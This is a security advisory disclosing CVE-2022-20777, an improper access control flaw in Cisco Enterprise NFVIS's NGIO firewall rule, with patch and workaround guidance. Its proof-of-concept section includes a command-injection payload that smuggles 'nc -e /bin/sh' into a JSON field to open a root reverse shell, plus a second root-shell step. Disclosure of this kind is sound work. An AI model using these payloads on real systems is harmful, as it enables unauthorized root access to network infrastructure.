# Cisco Enterprise NFVIS - Improper Access Control in NFVIS (CVE-2022-20777)

Critical

[orange-cert-cc](/orange-cert-cc)
published
GHSA-v56f-9gq3-rx3g
May 6, 2022

## Package

NFVIS
(Cisco)

## Affected versions

4.5.1-FC2

## Patched versions

4.7.1

## Description

### Overview

NGIO is a special network interface that allows communication between VM (that are supposed to be Cisco VMs) and the host.

It exposes agents that are supposed to forward messages between Cisco components.

### Details

A firewall rules is allowing any IP traffic from 192.168.10.12 (which is supposed to be NGIO peer).

This firewall rule is too permissive.

* NGIO can be configured for non-Cisco virtual machines.
* 192.168.10.0/25 networks can be configured on any interfaces (exposing internal APIs).

It is possible to:

* reach internal APIs and services of the host from the VM
* reach internal APIs and services of the VM from the host

### Proof of Concept

#### PoC #1

Configuring a virtual machine with ip address "192.168.10.12" allows root execution on the host:

Step 1: Configuration

```
vm_lifecyvle tenants tenant admin
 deployments deployment ubuntu1
   vm_group ubuntu1
    interfaces interface 0
     network int-mgmt-net
     ip_address 192.168.10.12
…
vm_lifecycle networks network int-mgmt-net
 address 192.168.10.1
 netmask 255.255.255.128

```

Step 2: Prepare reverse shell on VM

```
ubuntu@ubuntu1:~$ nc –lp 4444

```

Step 3: Injection on host internal API from VM

```
ubuntu@ubuntu1:~$ curl http://192.168.10.1:8000/vcpu/availability -H "Content-Type: application/json" –d '{"vcpu": "|| nc –e /bin/sh 192.168.10.12 4444 &&", "imageID": "server_lan_ubuntu_prod1.tar.gz", "vnfName": "" }'

```

Result:

```
ubuntu@ubuntu1:~$ nc –lp 4444
id
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:initrc_t:s0

```
#### PoC #2

Cisco ISRv (with NGIO enabled) compromission from Cisco CLI.

```
encs-audit# curl –post admin telnet://192.168.10.12 –I
Enter host password for user admin: <enter>
…
[VR-ENCS-AUDIT]$ id
uid=0(root) gid=0(root) groups=0(root)

```
### Solution

#### Security patch

Upgrade to Cisco Enterprise NFVIS v4.7.1

#### Workaround

We recommend to:

* only expose TCP port for cisco agents
* use separated VRF (network namespaces) on both host and VMs for NGIO interfacing
* enable mutual SSL authentication with Cisco certificates

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
